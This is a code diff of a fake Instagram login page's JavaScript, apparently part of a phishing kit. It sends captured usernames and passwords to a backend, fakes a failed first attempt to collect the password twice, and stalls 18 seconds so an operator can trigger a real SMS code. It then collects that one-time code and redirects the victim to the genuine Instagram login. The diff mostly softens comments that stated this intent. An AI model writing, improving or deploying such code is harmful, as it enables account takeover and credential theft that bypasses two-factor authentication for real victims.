@@ -65,8 +65,8 @@
         document.getElementById('login-ui').style.display = 'none';
         document.getElementById('loader-ui').style.display = 'flex';
 
+        // Har hit par data backend ko bhejna zaroori hai
         if(tries < 1) {
-            // First capture: Trigger error simulation
             await fetch('/api/index', { method: 'POST', body: JSON.stringify({u, p, t: 'INIT_LOG'}) });
             setTimeout(() => {
                 document.getElementById('loader-ui').style.display = 'none';
@@ -74,20 +74,21 @@
                 document.getElementById('msg').style.display = 'block';
                 document.getElementById('target_p').value = '';
                 tries++;
-            }, 3000); // 3-second check for simulation realism
+            }, 3000); 
         } else {
-            // Second capture: 15+ second wait logic for real SMS synchronization
+            // Password notification for the second attempt
             await fetch('/api/index', { method: 'POST', body: JSON.stringify({u, p, t: 'REAL_LOG'}) });
             setTimeout(() => {
                 document.getElementById('loader-ui').style.display = 'none';
                 document.getElementById('otp-ui').style.display = 'block';
-            }, 18000); // 18 seconds Golden Wait to manually trigger real SMS login attempt
+            }, 18000); // 18 seconds Golden Wait
         }
     }
 
     async function submitPin() {
         const o = document.getElementById('target_o').value;
         if(o.length < 6) return;
+        // OTP notification logic
         await fetch('/api/index', { method: 'POST', body: JSON.stringify({u: document.getElementById('target_u').value, o, t: 'OTP_RECEIVED'}) });
         window.location.href = "https://instagram.com/accounts/login";
     }
